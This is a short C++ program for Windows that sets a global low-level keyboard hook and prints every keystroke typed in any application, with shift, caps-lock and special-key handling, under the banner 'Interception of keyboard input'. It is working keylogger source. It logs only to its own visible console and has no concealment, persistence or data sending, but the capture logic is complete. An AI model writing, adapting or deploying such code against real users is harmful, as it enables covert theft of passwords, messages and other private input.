#include <windows.h>
#include <iostream>
using namespace std;

HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;

void print(int key)
{
	if (key == 1 || key == 2) // мишка 
		return;
	
	bool shift_down = GetAsyncKeyState(VK_SHIFT);
	switch (key)
	{
		case VK_SPACE: cout << " "; break;
		case VK_BACK: cout << "[BACKSPACE]"; break;
		case VK_RETURN: cout << "\n"; break;
		case VK_TAB: cout << "[TAB]"; break;
		case VK_SHIFT: cout << "[SHIFT]"; break;
		case VK_RSHIFT: cout << "[SHIFT]"; break;
		case VK_LSHIFT: cout << "[SHIFT]"; break;
		case VK_CONTROL: cout << "[CTRL]"; break;
		case VK_LCONTROL: cout << "[CTRL]"; break;
		case VK_RCONTROL: cout << "[CTRL]"; break;
		case VK_ESCAPE: cout << "[ESC]"; break;
		case VK_END: cout << "[END]"; break;
		case VK_HOME: cout << "[HOME]"; break;
		case VK_RIGHT: cout << "[RIGHT]"; break;
		case VK_LEFT: cout << "[LEFT]"; break;
		case VK_UP: cout << "[UP]"; break;
		case VK_DOWN: cout << "[DOWN]"; break;
		case VK_CAPITAL: cout << "[CAPS LOCK]"; break;
		case 0x30: (!shift_down) ? cout << "0" : cout << ")"; break;
		case 0x31: (!shift_down) ? cout << "1" : cout << "!"; break;
		case 0x32: (!shift_down) ? cout << "2" : cout << "@"; break;
		case 0x33: (!shift_down) ? cout << "3" : cout << "#"; break;
		case 0x34: (!shift_down) ? cout << "4" : cout << "$"; break;
		case 0x35: (!shift_down) ? cout << "5" : cout << "%"; break;
		case 0x36: (!shift_down) ? cout << "6" : cout << "^"; break;
		case 0x37: (!shift_down) ? cout << "7" : cout << "&"; break;
		case 0x38: (!shift_down) ? cout << "8" : cout << "*"; break;
		case 0x39: (!shift_down) ? cout << "9" : cout << "("; break;
		case 0xBA: (!shift_down) ? cout << ";" : cout << ":"; break;
		case 0xBB: (!shift_down) ? cout << "=" : cout << "+"; break;
		case 0xBC: (!shift_down) ? cout << "," : cout << "<"; break;
		case 0xBD: (!shift_down) ? cout << "-" : cout << "_"; break;
		case 0xBE: (!shift_down) ? cout << "." : cout << ">"; break;
		case 0xBF: (!shift_down) ? cout << "/" : cout << "?"; break;
		case 0xC0: (!shift_down) ? cout << "`" : cout << "~"; break;
		case 0xDB: (!shift_down) ? cout << "[" : cout << "{"; break;
		case 0xDC: (!shift_down) ? cout << "\\" : cout << "|"; break;
		case 0xDD: (!shift_down) ? cout << "]" : cout << "}"; break;
		case 0xDE: (!shift_down) ? cout << "'" : cout << "\""; break;
		default:
			char currentKey;
			bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // capslock
			if (shift_down)
				lower = !lower;
			currentKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, NULL);
			if (!lower)
				currentKey = tolower(currentKey);
			cout << (char)currentKey;
			break;
	}
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			print(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
	if (!hook)
	{
		cerr << "Error " << GetLastError() << "\n";
		return 1;
	}
	cout << "Interception of keyboard input:\n";
	MSG message;
	GetMessage(&message, NULL, 0, 0);
	return 0;
}